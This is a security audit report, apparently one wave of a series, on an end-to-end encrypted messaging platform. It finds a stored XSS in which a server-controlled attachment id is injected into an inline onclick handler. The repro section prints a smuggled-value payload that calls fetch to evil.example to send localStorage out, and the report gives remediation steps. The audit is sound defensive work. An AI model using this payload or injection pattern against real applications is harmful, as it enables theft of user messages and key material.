# Security Audit — WAVE 2 (Exploit-Class Lens)

**Scope:** Privacy-first E2E platform (auth_db, secure_db, payments_app, messaging_app, money_tracker) on shared Supabase (Postgres + RLS + Auth + Realtime + Storage + Edge Functions). Vanilla JS, `window.*` globals, GitHub Pages, vendored TweetNaCl, client keys in IndexedDB wrapped under a non-extractable WebCrypto AES-GCM key.

**Threat model in force:** malicious authenticated user, malicious peer, network MITM, and — critically — a curious/compromised server. Zero-knowledge must hold against the server itself; the server fully controls the HTTP/JSON response bodies the client deserializes and trusts.

**Method:** READ-ONLY adversarial review with the exploit-class (injection / parsing / untrusted-field-to-sink) lens. Every reported finding was traced end-to-end (source → sink) in the actual code. Findings already confirmed in prior waves (C-1, H-1..H-6, M-2..M-5, recovery-key testing value) are explicitly **excluded**; only materially-new vulnerability classes are reported here.

---

## 1. Summary

- **NEW issues found beyond prior waves: 1** (HIGH × 1).
- **Posture delta vs prior waves:** Prior waves established that the design's confidentiality guarantees are sound in principle but leak metadata (H-6) and lean on client-side enforcement (H-3) and a permissive CSP (H-5). This wave surfaces a **distinct integrity/injection class** not previously catalogued: a **server-controlled JSON field reaching a JavaScript execution sink**. This is a qualitatively worse posture point than the prior confidentiality findings because it converts the in-scope "compromised server" from a passive eavesdropper into an **active code-execution adversary in the client origin**, which directly defeats the zero-knowledge promise (decrypts/exfiltrates live key material). The existing H-5 (`unsafe-inline` CSP) is the enabler that makes this injection executable rather than merely structural — the two compound. Net: the server-trust boundary is weaker than prior waves implied, because the client validates ids at *query* boundaries but not at *render* boundaries.

---

## 2. Findings by Severity

### HIGH

#### NEW-H1 — Server-controlled attachment `id` interpolated raw into an inline `onclick` handler → XSS / zero-knowledge collapse against a compromised server

**Attacker model:** Curious/compromised server (explicitly in scope — zero-knowledge must hold against the server), or any party that controls the JSON body of a PostgREST/Storage response for the `message_attachments` table (e.g. a server-side compromise, a malicious DB function, or a MITM that can rewrite an authenticated-but-not-end-to-end-integrity-protected REST response). No peer crypto compromise and no victim interaction beyond *opening the conversation* are required. The `id` column being `BIGSERIAL` is irrelevant: in this threat model the server controls the response body and can place an arbitrary string in the `id` field regardless of the column type.

**File:line (sink):** `messaging_app/messaging/controllers/messengerController.js:1116` — the active `onclick` handler:
```js
onclick="MessengerController.downloadAttachment(${attId})"
```
where `attId = att.id` is set at `:1097` and interpolated **raw** (no coercion, no validation) into a JS-string context inside an inline event-handler attribute. The same untrusted id is also interpolated into `data-attachment-id="${attId}"` in the expired branch at `:1105` and in the active branch at `:1116`. The HTML string is committed to the DOM via `innerHTML` at `:1073` (`_updateMessageAttachments`).

**File:line (source):** `messaging_app/messaging/services/attachmentService.js:610-626` — `getMessageAttachments()` does `.select('id, file_name, ...')` and returns each row verbatim via `{ ...att, expired: ... }`. The row `id` is passed through unmodified. The controller is the only producer of `message.attachments` and assigns this service result directly on both the history-load and realtime paths.

**The unguarded hole:** `_isValidId()` (`attachmentService.js:260-268`) *does* enforce "positive integer or numeric string", but it is applied **only**:
- to the **outbound** `messageId` query argument (`attachmentService.js:602`), and
- to the **user-clicked** id inside `downloadAttachment` (controller, click-time path).

It is **never** applied to the **inbound returned-row `id`** on the render path. `_escapeHtml` (controller `:1119`) is applied only to `fileName`/`fileSize`, and HTML-entity escaping cannot neutralize a JS-string-context payload anyway. The `_sanitizeFileName` hardening (MSG-05) touches only the file name. No DOMPurify, Trusted Types, or global output sanitizer exists in the project.

**Repro:**
1. Compromised/curious server (or response-body MITM) returns, for one `message_attachments` row that the victim is entitled to read:
   ```json
   { "id": "1);fetch('https://evil.example/x?d='+btoa(JSON.stringify(localStorage))//",
     "file_name": "report.pdf", "file_size": 1024, "mime_type": "application/pdf",
     "expires_at": null, "created_at": "2026-06-22T00:00:00Z" }
   ```
   (A more damaging variant exfiltrates IndexedDB-wrapped key material instead of `localStorage`.)
2. Victim opens the conversation. `getMessageAttachments()` returns the row unchanged (`attachmentService.js:623-626`).
3. The controller assigns it to `msg.attachments` and renders via `_updateMessageAttachments` → `_renderAttachmentItem`, producing:
   ```html
   <div ... onclick="MessengerController.downloadAttachment(1);fetch('https://evil.example/x?d='+btoa(JSON.stringify(localStorage))//)" ...>
   ```
4. With the in-scope, prior-wave-confirmed **H-5 `unsafe-inline`** CSP present, the inline handler is permitted; the injected expression executes in the messenger origin on user interaction (and the markup is committed on render).

**Impact:** Arbitrary JavaScript execution in the messenger origin for any recipient who views a malicious attachment row. That code runs **with the page's live WebCrypto AES-GCM unwrap handle and decrypted Double-Ratchet state**, so it can decrypt and exfiltrate messages and the wrapped key material in IndexedDB. This **collapses the zero-knowledge guarantee the design promises to hold against the server itself** — without compromising any peer's crypto, the server simply lies in a JSON field the client assumed was a safe integer.

**Exploitability:** Practical for the in-scope compromised/curious-server (and response-body-controlling MITM) attacker. No peer crypto compromise needed; no special victim action beyond opening the thread. **Severity HIGH (not CRITICAL)** because it requires an actively malicious/compromised server rather than a mere authenticated peer, and its *code-execution* reach depends on the separately-tracked H-5 `unsafe-inline` CSP — if `script-src` dropped `unsafe-inline`, the inline-handler execution would be neutralized as defense-in-depth (the markup injection would remain, but without script execution). It is a distinct class from prior **H-6** (attachment metadata plaintext = confidentiality): this is an **injection/integrity sink** (server-controlled field → JS execution context), so it is in scope and not a duplicate.

**Remediation:** Treat every server-returned id as untrusted at the *render* boundary, not only at *query* boundaries.
1. **Coerce + drop at the source** — in `getMessageAttachments()` map (`attachmentService.js:623-626`): `id: Number(att.id)` and drop rows where `!Number.isInteger(id) || id <= 0`.
2. **Eliminate the inline-handler interpolation** — in `_renderAttachmentItem` (`messengerController.js:1116`) render only `data-attachment-id="${Number(attId)}"` and attach a delegated `addEventListener('click', ...)` on the thread container that reads the data attribute and re-validates with `_isValidId` before calling `downloadAttachment`. At minimum, interpolate `Number(attId)` and bail when `NaN`.
3. **Apply the same `Number()` coercion** to the expired-branch data-attr (`:1105`) and defensively in `_renderDeleteControl` (`:1145`), and coerce `message.id` where it feeds delete controls.
4. **Defense-in-depth (already tracked as H-5):** tighten CSP `script-src` to drop `unsafe-inline`, which blocks inline-handler execution outright.

---

## 3. Uncertain Items

None. The single new finding was traced end-to-end against the live source (source `attachmentService.js:610-626`; validator gap `:260-268` / `:602`; sink `messengerController.js:1097/1105/1116`; DOM commit `:1073`) and is reported with HIGH confidence. No additional candidate exploit-class issues reached the confidence bar for reporting in this wave.

---

## 4. Prioritized Remediation

1. **NEW-H1 (HIGH) — close the render-boundary id-trust gap.** Lowest-effort, highest-leverage fix: add the `Number()` coercion + drop in `getMessageAttachments()` (one map block) and stop interpolating ids into inline handlers (delegated listener + `data-attachment-id`). This kills the injection independent of CSP.
2. **Compound with H-5 (prior-wave, HIGH).** Dropping `unsafe-inline` from `script-src` neutralizes the *execution* of any residual inline-handler injection across the whole app, hardening NEW-H1 and the entire DOM surface in one change.
3. **Generalize the lesson:** audit every other render path that interpolates a server-returned scalar into HTML/JS sinks for the same query-boundary-only validation pattern (validate at the *render* boundary, treat all server JSON fields as untrusted under the compromised-server model).

---

*Wave 2 exploit-class audit. READ-ONLY. Prior-wave findings (C-1, H-1..H-6, M-2..M-5, recovery-key testing value) intentionally excluded.*
